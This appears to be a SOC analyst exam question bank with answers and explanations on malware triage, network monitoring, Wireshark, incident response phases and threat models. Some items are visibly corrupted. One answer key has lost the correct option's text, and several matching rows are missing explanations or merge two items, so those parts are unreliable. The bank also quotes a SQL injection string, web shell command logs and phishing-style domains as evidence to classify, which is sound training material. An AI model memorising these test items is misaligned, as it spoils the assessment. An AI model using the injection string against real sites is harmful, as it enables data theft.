q.q: A sample did nothing in a 2-minute sandbox run. Static analysis shows it calls Sleep for 15 minutes first. What is the right conclusion?
o: It may be stalling, so run it longer
Right. Long sleeps are a common way to outwait short sandbox runs.
The file is harmless
No activity in 2 minutes doesn't prove anything.
The sandbox is broken
The sandbox did its job. The sample waited.
The sample only runs on Linux, not on Windows
Sleep calls don't show the platform.

q.q: A hash scores 0 of 70 on a reputation site, but the sandbox shows it encrypting files and deleting shadow copies. What should the analyst trust?
o: The behavior seen in the sandbox
Right. A new sample can be unknown to engines but still act maliciously.
The 0 of 70 score
No detections often just means the file is new.
The file name
File names are easy to fake.
The file size
Size says nothing about intent.

q.q: From a sandbox report, which artifact BEST helps block the same malware at the network edge?
o: Its C2 domain and IP
Right. Network indicators can be blocked at the firewall, DNS and proxy.
The mutex name
A mutex is useful for host searches, not network blocking.
The registry key it added for persistence
Registry keys live on hosts.
The process ID in the sandbox
PIDs change every run.

q.q: The team blocks a malware hash. The attacker adds one byte to the file and sends it again. What happens?
o: Its hash is totally new, so it gets through
Right. Any change creates a different hash, so exact-hash blocks are fragile.
The hash stays almost the same
Cryptographic hashes change completely with any change.
The file can't run anymore
One added byte usually doesn't break the file.
The block still works because the file name is the same
Hash blocks don't look at names.

q.q: Which domain does this URL REALLY belong to: hxxps://paypal.com.secure-login.example.ru/account?
o: example.ru
Right. The registered domain is read from the right: example.ru. The rest are subdomains.
paypal.com
paypal.com is only a subdomain label here.
secure-login.com
No such domain appears in the URL.
account
account is part of the path.

q.q: Why do many teams prefer SHA-256 over MD5 for evidence and malware hashes?
o: MD5 has practical collisions
Right. SHA-256 has no known practical collisions.
SHA-256 hashes are shorter
SHA-256 output is longer than MD5's.
MD5 can't hash executables
MD5 can hash any file.
SHA-256 also encrypts the file while it hashes it
Hashing doesn't encrypt.

q.q: An email link shows as apple.com, but the actual link is xn--pple-43d.com. What is this?
o: A Punycode look-alike domain
Right. xn-- marks Punycode, which can make a fake domain look like a real one.
Apple's official short link for marketing emails
Official Apple links use apple.com.
A URL shortener
Shorteners don't use xn-- names.
An IPv6 address
IPv6 addresses don't look like this.

q.q: Event: [1:2019401:3] ET TROJAN Possible beacon detected, 10.2.3.4:51122 -> 198.51.100.8:80. Which technology made it?
o: An IDS/IPS
Right. Signature IDs like 1:2019401 and rule names come from IDS/IPS rules.
NetFlow
NetFlow has no signatures or rule names.
A web proxy
Proxy logs show URLs, users and actions.
Antivirus on the host
Antivirus names files and detections, not network signature IDs.

q.q: Record: 10.1.4.20 > 203.0.113.5, TCP 443, 1,212 packets, 1.8 MB, start 09:14:02, end 09:31:40. No payload. Which source is this from?
o: NetFlow
Right. Flow records hold addresses, ports, counts and times, without content.
Full packet capture
A capture would include the payload.
IDS alert
Nothing here names a rule or attack.
Email filter log
Email logs show senders, recipients and attachments.

q.q: Log: user=asmith app=Dropbox action=deny reason=policy. Which technology wrote this?
o: Network application control
Right. It identified the app by name and enforced a policy on it.
Traditional stateful firewall
A stateful firewall knows ports, not app names.
Host antivirus
Antivirus scans files. It doesn't block apps by policy.
NetFlow collector
NetFlow can't deny traffic.

q.q: Malware sent 2 GB out of the network last month. No tool raised an alert. Which outcome is this?
o: False negative
Right. A real attack happened and nothing alerted.
False positive
A false positive is an alert with no real attack.
True negative
True negative means no attack and no alert.
True positive
A true positive needs an alert.

q.q: An IDS alerts on a port scan. It turns out to be the security team's own scheduled, approved vulnerability scan. How should the analyst classify it?
o: Benign
Right. The alert was accurate, but the activity was approved and harmless.
False negative
An alert did fire.
True positive needing a response
The activity was approved, so no incident response is needed.
True negative
An alert fired, so it isn't a negative.

q.q: An IDS flags a large file upload as exfiltration. The analyst confirms it's the normal nightly backup to the company's own cloud tenant. Which outcome is this?
o: False positive
Right. The alert called normal traffic an attack.
True positive
There was no attack.
False negative
False negatives are missed attacks.
Benign
Benign means the detection was accurate, like an approved scan. Here it misread a normal backup as exfiltration.

q.q: An attacker sends SQL injection inside normal HTTP on TCP 80. Which device can spot it?
o: One with deep packet inspection
Right. DPI reads the application payload, where the injection is.
A stateless packet filter
It only checks headers like IPs and ports.
A stateful firewall without any payload inspection
It tracks sessions but doesn't read payloads.
A Layer 2 switch
Switches forward frames by MAC address.

q.q: A stateless ACL lets inside users reach web sites. Why must the admin also add a wide rule for return traffic?
o: It doesn't track sessions, so replies look new
Right. Without state, the filter can't tell a reply from a new inbound packet.
Return traffic always uses UDP
Web replies use TCP.
Stateless filters block every TCP ACK packet by default
Defaults depend on the rules written.
Replies come from a different router
The path isn't the reason.

q.q: A stateful firewall sees an inbound TCP ACK that matches no open connection. What does it do by default?
o: Drop it, since it fits no session
Right. Stateful firewalls track sessions and drop packets that don't fit one.
Allow it, because ACKs are always replies
An ACK with no session is a sign of scanning or spoofing.
Send it to deep packet inspection for a payload check first
Stateful logic drops it before any payload check.
Turn it into a SYN
Firewalls don't rewrite flags like that.

q.q: Policy says detected exploit attempts must be stopped before they reach the server. How must the sensor be deployed?
o: Inline, as an IPS
Right. Only a device in the traffic path can drop packets.
On a SPAN port
A SPAN port gets a copy. It can't block.
On a network tap
A tap gets a copy and can't stop the original.
As a NetFlow collector
NetFlow summarizes traffic after the fact.

q.q: What is a main RISK of putting a sensor inline compared with a tap?
o: Added latency and a failure point
Right. If an inline device fails closed, traffic stops. If it fails open, protection stops.
It can't see any traffic
Inline devices see every packet that passes.
It can only read NetFlow
Inline sensors read full packets.
It needs every protected host to run an agent
Inline sensors are agentless.

q.q: A busy switch's SPAN port sometimes drops packets during peaks. Which option gives a more complete copy for monitoring?
o: A passive network tap
Right. A tap copies every frame on the wire, without the switch picking what to send.
A second SPAN session on the same switch
It shares the same switch limits.
Turning on NetFlow
NetFlow summarizes. It doesn't copy packets.
An inline IPS set to drop mode
That changes traffic. It isn't a fuller monitoring copy.

q.q: Leadership wants a year of who-talked-to-whom records for every host, with little storage. Which source fits BEST?
o: NetFlow
Right. Flow records are small, so a year of them is affordable.
Full packet capture from a tap
A year of full packets would need huge storage.
IDS alerts only
Alerts cover only what rules flag.
Antivirus logs
Antivirus doesn't record connections.

q.q: An analyst must rebuild a PDF a host downloaded last night. Which data source makes this possible?
o: Full packets captured from a tap
Right. The payload is needed to rebuild the file.
NetFlow
NetFlow shows the download happened, not its content.
DHCP logs
DHCP has no file content.
Firewall session logs
Session logs don't keep payloads.

q.q: Compared with full captures, what can NetFlow NOT tell you about a suspicious session?
o: What data was inside the packets
Right. NetFlow records metadata, not content.
The source and destination IP addresses of the session
NetFlow records both.
How many bytes moved
Byte counts are in every flow record.
When the session started
Start and end times are recorded.

q.q: In Wireshark, what is the QUICKEST way to save an executable that was downloaded over plain HTTP in a PCAP?
o: File > Export Objects > HTTP
Right. Wireshark rebuilds files sent over HTTP from the stream.
Statistics > Conversations
This lists talkers. It doesn't save files.
Edit > Preferences > Name Resolution
This changes how names are shown.
Apply a display filter of tcp.port == 80 and save
A filter narrows the view but doesn't extract anything.

q.q: Follow TCP Stream shows a file transfer, but the exported file won't open. The capture is missing many segments. Why?
o: Gaps in the stream corrupt the file
Right. Missing segments mean missing bytes, so the file is corrupt.
Wireshark can't export files carried over TCP
Wireshark exports files from TCP streams all the time.
The file was too small to export
Size isn't the issue.
Export only works on UDP
Export works on TCP-based protocols like HTTP and SMB.

q.q: An analyst tries Export Objects on a malware download over HTTPS. Nothing appears. What is the MOST likely reason?
o: No TLS keys were loaded
Right. Without session keys, Wireshark can't see the HTTP inside TLS.
HTTPS doesn't use TCP
HTTPS normally runs over TCP.
The file was compressed before it was sent
Compression doesn't hide objects from export.
Wireshark only exports images
It exports many file types.

q.q: A PCAP shows 10.0.0.5:51515 -> 10.0.0.20:445 [SYN], then 10.0.0.20:445 -> 10.0.0.5:51515 [SYN, ACK]. Which host started the connection?
o: Right. The host that sends the first SYN is the client that started it.
It replied with SYN-ACK, so it's the server.
Neither, because both sent SYN
Only one host sent a plain SYN.
The default gateway
The gateway isn't in this exchange.

q.q: In one PCAP, a host connects to TCP 4444 on an outside IP and the payload starts with MZ. What does this suggest?
o: A Windows executable on an odd port
Right. MZ is the header of Windows executables, and 4444 is a common attack tool port.
A normal web page load from a content server
Web traffic uses 80 or 443 and starts with HTTP headers.
A DNS lookup
DNS uses port 53.
An email being sent
SMTP uses 25 or 587 and starts with text commands.

q.q: Which PCAP clue BEST tells you which side is the server in a TCP session?
o: It listens on a well-known port
Right. Servers listen on known ports. Clients pick random high ports.
It has the higher IP address
IP values say nothing about roles.
It sends more packets than the other side
Clients can send more, like during uploads.
It has the lower TTL
TTL depends on the OS and distance.

q.q: A scan sends TCP packets with the FIN, PSH and URG flags set to many ports. What is it?
o: An Xmas scan
Right. FIN, PSH and URG together light up the header like a tree.
A SYN scan
A SYN scan sets only SYN.
A NULL scan
A NULL scan sets no flags.
A normal session teardown
Teardown uses FIN and ACK, not PSH and URG together.

q.q: A host claiming to be a Linux web server sends replies with an IP TTL of 127, one hop away. What does this hint?
o: It may be Windows, which starts at 128
Right. Windows usually starts at 128 and Linux at 64.
It's a Linux host with a nearly full disk
Disk space doesn't change TTL.
The packets were encrypted
Encryption doesn't change TTL.
It's using IPv6
IPv6 uses Hop Limit, and 127 doesn't mean IPv6.

q.q: Captures show many unsolicited ARP replies saying 192.168.1.1 is at aa:bb:cc:11:22:33, but the router's real MAC is different. What is this?
o: ARP spoofing
Right. Fake replies claim the gateway's IP to pull its traffic.
A normal DHCP renewal
DHCP doesn't send ARP replies for the gateway.
An ICMP redirect
ICMP redirects are a separate protocol.
A broadcast storm
A storm is a flood of broadcasts, not fake replies.

q.q: DNS logs show one host asking for TXT records thousands of times an hour, with replies near maximum size. What does this suggest?
o: DNS tunneling
Right. Large, frequent TXT replies are a common sign of DNS tunneling.
Normal email checks such as SPF lookups
Mail checks make a few TXT lookups, not thousands.
A DHCP problem
DHCP doesn't use DNS TXT records.
A slow web page
Web pages query A and AAAA records, not huge TXT records.

q.q: A sandbox trace shows VirtualAllocEx, WriteProcessMemory and CreateRemoteThread aimed at explorer.exe. What is happening?
o: Process injection
Right. Allocating and writing memory in another process, then starting a thread there, is classic injection.
A normal print job
Printing doesn't write into Explorer's memory.
File encryption
No file API calls appear.
A DNS lookup
DNS uses other APIs.

q.q: Web logs show: GET /uploads/img.php?c=whoami 200 and GET /uploads/img.php?c=net+user 200. What does this MOST likely show?
o: A web shell
Right. A script in an upload folder taking commands in a parameter is a web shell.
Image thumbnails being made on upload
Thumbnails don't take commands like whoami.
A normal login page
Login pages don't run net user.
A broken link check
Link checkers don't send OS commands.

q.q: An alert: process winword.exe started powershell.exe, which connected to 198.51.100.50:8080. Which artifact is MOST suspicious?
o: Word starting PowerShell
Right. An Office app launching a shell often means a malicious macro.
The use of port 8080
8080 is common for proxies and web apps.
Word running at all
Word is normal on a desktop.
The destination being an IPv4 address
IPv4 destinations are normal.

q.q: Which regex matches a lowercase or capital 'admin' as a whole word, but not 'sysadmin'?
o: \b[Aa]dmin\b
Right. \b marks word boundaries, and [Aa] allows either case.
admin.*
This matches 'admin' anywhere, including inside 'sysadmin'.
^Admin
This needs Admin at the start of the line and misses lowercase.
[admin]
Square brackets match one character, not the word.

q.q: An analyst wants a literal match on example.com in logs. Why write example\.com instead of example.com?
o: An unescaped dot matches any one character
Right. Without the backslash, examplexcom would match too.
The backslash makes the match case-insensitive
Backslash escaping doesn't change case.
Dots aren't allowed in regex
Dots are allowed. They just mean any character.
It stops the regex from matching subdomains
It doesn't stop subdomains from matching.

q.q: Which lines does grep -E 'Failed password for (invalid user )?root' match?
o: Both forms, with or without 'invalid user '
Right. The ? makes the group optional, so it matches with or without it.
Only lines with 'Failed password for invalid user root'
The ? means the group can be missing.
Any line with 'root' anywhere
The whole phrase must match.
Only successful root logins
The pattern looks for 'Failed password'.

q.q: A new SOC finds that nobody knows how many servers the company has. Which program should come FIRST?
o: Asset management
Right. You can't protect, patch or monitor what you don't know you have.
Patch management
Patching needs a list of what to patch.
Mobile device management
MDM covers phones and tablets only.
Penetration testing
Testing comes after you know your assets.

q.q: A server's firewall rules no longer match the approved baseline, and nobody filed a change request. Which practice catches and prevents this drift?
o: Configuration management
Right. Baselines and change control keep systems in a known state.
Asset management
Asset management tracks what exists, not how it's set up.
Vulnerability management
Vulnerability management finds weaknesses. It doesn't own baselines.
Incident response
IR handles incidents after they happen.

q.q: An employee loses a company phone with work email on it. Which tool lets the SOC wipe work data from it remotely?
o: Mobile device management
Right. MDM can lock, locate and wipe enrolled devices.
NetFlow
NetFlow sees traffic, not devices.
A web proxy
A proxy filters web traffic only.
Configuration management database
A CMDB records configuration. It can't wipe a device.

q.q: How does vulnerability management differ from patch management?
o: It's the whole cycle; patching is one fix
Right. Vulnerability management is the whole cycle. Patching is one way to fix what it finds.
They are the same thing
Patching is only one part.
Patch management is the part that finds the weaknesses
Scanning and ranking belong to vulnerability management.
Vulnerability management only covers phones
It covers every kind of asset.

q.q: Under NIST SP 800-61, which item belongs in the incident response PLAN, not a procedure?
o: Management approval and a maturity roadmap
Right. The plan holds the mission, goals, approval, approach, communication, metrics and roadmap.
Step-by-step commands to image a suspect laptop
Detailed steps are procedures.
The router's admin password
Credentials don't belong in the plan.
A list of every past alert
Alert history is data, not plan content.

q.q: Which of these is an element NIST SP 800-61 lists for an incident response plan?
o: Metrics for the IR capability
Right. The plan includes metrics to track how well IR works.
A copy of the firewall ruleset
A ruleset is configuration.
Each analyst's home address
Personal details aren't plan elements.
The SIEM's current correlation rules
Detection rules are technical content.

q.q: A team writes down how it will share updates with management, legal and other teams during an incident. Which part of the IR plan is this?
o: How the team talks to the organization
Right. Communication with other groups is a core plan element.
The evidence retention procedure
Retention is a separate topic.
The lessons-learned report
Lessons learned come after an incident.
The detailed containment strategy for ransomware
Containment strategies are specific to incident types.

q.q: An analyst confirms ransomware on one workstation that is still on the network. What should happen NEXT?
o: Isolate it from the network
Right. Containment stops the spread. Keeping it powered on saves memory evidence.
Power it off right away
Powering off loses volatile evidence. Isolate it instead.
Restore it from last night's backup
Restoring comes after containment and eradication.
Write the lessons-learned report
That's the last phase.

q.q: A user reports a phishing email. The analyst confirms the link is malicious. Before containment, what should the analyst find out?
o: Who else got it and who clicked
Right. Scoping during analysis shows how far it spread.
The attacker's real name
Attribution isn't needed to contain.
The user's job title
That doesn't scope the incident.
Which antivirus vendor has the cheapest license
Not relevant here.

q.q: Malware has been removed and the root cause patched. Systems are restored from clean backups. What should the team do during recovery?
o: Watch for signs of reinfection
Right. Recovery includes monitoring to confirm the threat is gone.
Delete all logs from the incident
Logs are needed for review and evidence.
Turn off the IDS for a while to cut alert noise
Monitoring matters most right after recovery.
Close the ticket with no review
A post-incident review still follows.

q.q: Building a jump kit with forensic laptops, write blockers and cables happens in which NIST SP 800-61 phase?
o: Preparation
Right. Tools and training are set up before an incident.
Detection and analysis
That phase is about finding and confirming incidents.
Containment, eradication and recovery
That phase uses the tools, it doesn't build them.
Post-incident activity
That phase reviews the incident.

q.q: Deciding how serious an incident is and ranking it against others happens in which phase?
o: Detection and analysis
Right. Prioritizing based on impact is part of analysis.
Preparation
Preparation sets up the process, but ranking real incidents happens during analysis.
Containment, eradication and recovery
That phase acts on the ranking.
Post-incident activity
That phase is after the incident.

q.q: Under NIST SP 800-61, deciding how long to keep evidence after an incident belongs to which phase?
o: Post-incident activity
Right. Evidence retention is covered with lessons learned.
Preparation
Preparation sets up tools and policy, but retention decisions for a closed incident come after.
Detection and analysis
That phase gathers evidence. It doesn't decide retention.
Containment, eradication and recovery
That phase stops and removes the threat.

q.q: An incident may have exposed customer data. Which stakeholder decides whether the law requires notifying customers or regulators?
o: Legal counsel
Right. Legal reviews notification and liability duties.
The help desk
The help desk supports users. It doesn't decide legal duties.
The network team
The network team handles containment work.
The SIEM vendor
Vendors don't decide your legal duties.

q.q: Reporters start calling about a breach. Who should speak to the media?
o: Public affairs
Right. One trained voice keeps the message accurate and consistent.
The analyst who found the breach first
Analysts shouldn't talk to the press.
Any manager who answers the phone
Uncoordinated answers cause confusion.
The SOC shift lead on duty
The SOC works the incident. Media questions go to public affairs.

q.q: A defense contractor that handles Controlled Unclassified Information finds a breach. Under DFARS 252.204-7012, which is TRUE?
o: It must report the incident to the DoD within 72 hours
Right. The clause requires rapid reporting within 72 hours of discovery.
It only has to report incidents with more than 1,000 records
No record threshold applies.
It can wait until the investigation is finished
Reporting can't wait for the full investigation.
It reports only to its own insurer
The DoD must be told.

q.q: Following order of volatility, which should be collected FIRST from a running server?
o: Memory (RAM)
Right. RAM is lost at power-off, so it comes before disks and backups.
The hard disk
Disks keep data after power-off, so they come later.
Backup tapes
Archives are the least volatile.
Printed reports
Paper isn't volatile at all.

q.q: An analyst images a disk with a write blocker and records the image's SHA-256 before and after analysis. What does this protect?
o: Data integrity
Right. Matching hashes show the evidence didn't change.
Data availability
Availability isn't the goal of hashing evidence.
Network throughput
Not related.
Volatile data
Disk images aren't volatile.

q.q: Why does NIST SP 800-86 say to analyze a COPY of the evidence instead of the original?
o: It keeps the original unchanged
Right. Working on a verified copy keeps the original unchanged.
Copies run faster on every tool
Speed isn't the reason.
Originals can't be hashed
Originals can and should be hashed.
Copies don't need any chain of custody
Copies need custody records too.

q.q: One workstation keeps a single TCP session open to an outside IP for 19 hours. Most user sessions last minutes. Which profiling element shows this?
o: Session duration
Right. Very long sessions to unknown hosts can mean C2 or exfiltration.
Total throughput
Throughput is about volume, not how long a session lasts.
Critical asset address space
That element is about which address ranges matter most.
Ports used
The port isn't the point here.

q.q: Why should a SOC know the critical asset address space?
o: Alerts there can be ranked higher
Right. Knowing where the crown jewels sit speeds triage.
It lets the SOC turn off logging everywhere else
Other ranges still need monitoring.
It replaces the need for NetFlow
It adds context. It doesn't replace data.
It shows every user's password
Address space has nothing to do with passwords.

q.q: A subnet's total throughput is usually 50 Mbps. At 03:00 it jumps to 900 Mbps outbound. What is this an example of?
o: A baseline change worth a look
Right. A big jump against the normal profile is a lead.
Normal traffic, because throughput always varies
Some change is normal. An 18x spike at 03:00 isn't.
A DHCP problem
DHCP doesn't push hundreds of Mbps.
Proof of a DDoS attack against the subnet
Outbound volume points to the subnet sending, not being hit.

q.q: A web server that only ever listened on 80 and 443 is now listening on TCP 31337. Which server profiling element caught this?
o: Listening ports
Right. A new listening port on a known server is a red flag.
Logged-in users
No user change is described.
Running tasks
Tasks aren't mentioned.
Total throughput
That's a network profiling element.

q.q: The service account svc_sql normally runs only the database service. Logs show it signing in interactively through Remote Desktop. Why is this suspicious?
o: Service accounts shouldn't log on interactively
Right. A service account used by a person suggests stolen credentials.
Service accounts can't use passwords
Service accounts do use credentials.
RDP never works on servers
RDP is common on Windows servers.
Database servers don't need service accounts at all
Most do.

q.q: A new scheduled task named UpdaterSvc runs a PowerShell script from C:\ProgramData every hour on a file server. Which profiling element shows the change?
o: Running tasks
Right. New scheduled tasks are a common persistence method.
Listening ports
No new port is described.
Session duration
That's a network profiling element.
Logged-in users
No logon is described.

q.q: A spreadsheet holds patient names, dates of birth and diagnoses. What type of protected data is this?
o: PHI
Right. Health details tied to a person are protected health information.
Intellectual property
IP covers creations like designs and code.
Public data
Patient records aren't public.
Only PII, with no extra protection
Health details tied to a person make it PHI.

q.q: A company's unreleased product designs and source code are stolen. What type of protected data was lost?
o: Intellectual property
Right. Designs, code and trade secrets are IP.
PHI
There's no health data.
PII
There's no personal data.
Payment card data
No card numbers are involved.

q.q: Which item is PII on its own?
o: A full name with an SSN
Right. Together they identify a specific person.
The company's quarterly revenue
That's business data, not personal.
A server's fully qualified host name
Host names identify machines.
A firewall rule
Rules are configuration.

q.q: An employee receives an email with a malicious Word file attached. Which Cyber Kill Chain stage is this?
o: Delivery
Right. Delivery is the weapon reaching the target, here by email.
Weaponization
Weaponization is building the file before it's sent.
Exploitation
Exploitation is when the code runs on the target.
Installation
Installation is putting persistent malware on the host.

q.q: In the Diamond Model, a C2 domain the attacker registered belongs to which vertex?
o: Infrastructure
Right. Domains, IPs and servers the attacker uses are infrastructure.
Capability
Capability is the malware or technique.
Adversary
The adversary is the attacker.
Victim
The victim is the target.

q.q: After the macro runs, malware adds a service so it starts on every boot. Which kill chain stage is this?
o: Installation
Right. Setting up persistence on the host is installation.
Delivery
Delivery already happened when the file arrived.
Command and control
C2 is when the malware talks back to the attacker.
Reconnaissance
Recon is research before the attack.

q.q: An attacker got in on March 1. The SOC spotted it on March 20. Which metric is 19 days?
o: Time to detect
Right. It measures from compromise to detection.
Time to contain
Containment comes after detection.
Time to respond
Responding starts after detection.
Time to control
Control is reached after response actions.

q.q: Why does a long time to detect usually mean a bigger investigation scope?
o: The attacker had longer to spread
Right. Each extra day can add systems and records to check.
Logs grow smaller over time
Logs grow larger.
Longer detection always means the attacker is weaker
It often means a stealthier one.
It shrinks the number of affected systems
It usually grows it.

q.q: Detection happened at 09:00. The infected hosts were cut off from the network at 13:30. Which metric is 4.5 hours?
o: Time to contain
Right. It measures from detection to stopping the spread.
Time to detect
That runs from compromise to detection.
Mean time between failures
That's a reliability metric.
Recovery point objective
RPO is about acceptable data loss.

q.title: Match the log to its source
q.scenario: Five log lines from one investigation. Pick the technology that most likely wrote each one.

rows.why: A signature ID and rule name come from an IDS/IPS.
An access rule denying a connection is a firewall log.
User, URL and category come from a web proxy.
Addresses, counts and duration with no payload is a flow record.
A detection name and a file quarantine come from antivirus.

q.title: Classify the alert outcome
q.scenario: Four results after triage. Pick the outcome for each one. Two options are distractors.

items.text: An IDS alert on a SQL injection proves real; the attacker pulled data.
items.why: A real attack with an alert is a true positive.

items.text: An alert fires on a payroll export that turns out to be normal work.
items.why: An alert on harmless traffic it misread is a false positive.

items.text: Weeks later, a breach is found that no tool ever alerted on.
items.why: A real attack with no alert is a false negative.

items.text: The red team's approved scan triggers an accurate scan alert.
items.why: The alert is accurate, but the activity is approved and harmless.

q.title: Pick the NIST SP 800-61 phase
q.scenario: Five incident tasks. Pick the NIST SP 800-61 phase each one belongs to.

rows.req: Run a tabletop exercise and update the call list.
rows.why: Training and contact lists are set up before incidents.

rows.req: Check an IDS alert against host logs to confirm it's real.
rows.why: Confirming and scoping an alert is analysis.

rows.req: Disable the stolen account and block the C2 domain.
rows.why: Cutting off the attacker is containment.

rows.req: Rebuild the infected server from a clean image.
Hold a lessons-learned meeting and update the playbook.

q.title: Map the Cyber Kill Chain
q.scenario: Four steps from one intrusion. Pick the Cyber Kill Chain stage for each. Two options are distractors.

items.text: The attacker studies staff profiles on LinkedIn.
The attacker builds a Word file with a malicious macro.
items.why: Building the weapon before sending it is weaponization.

items.text: The victim enables macros and the exploit code runs.
items.why: Code running on the target is exploitation.

items.text: The implant checks in with an outside server every minute.
items.why: Talking back to the attacker is command and control.

q.title: Name the monitoring data type
q.scenario: Five pieces of data in a SOC. Pick the data type each one is.

rows.req: A PCAP with every byte of a suspicious SMB transfer.
rows.why: Every byte, payload included, is a full capture.

rows.req: Host A talked to host B on TCP 22 for 40 minutes and sent 2 MB.
rows.why: A summary of one whole conversation is session data.

rows.req: DNS log: query evil.example A, answer 203.0.113.9.
rows.why: One request paired with its response is transaction data.

rows.req: The HR subnet averages 30 Mbps at noon on weekdays.
rows.why: Averages over time are statistical data.

rows.req: IPS: possible SQL injection, severity high.
rows.why: A rule firing produces alert data.

q.title: Name the attack from the evidence
q.scenario: Four pieces of evidence. Pick the attack each one shows. Two options are distractors.

items.text: Search box input: ' UNION SELECT card_no FROM payments--
items.why: A UNION SELECT in input targets the database.

items.text: A forum post with a script tag runs in every reader's browser.
items.why: Saved script that runs for each visitor is stored XSS.

items.text: Thousands of SYNs from spoofed IPs, no ACKs, full backlog.
items.why: Unfinished handshakes that use up resources are a SYN flood.
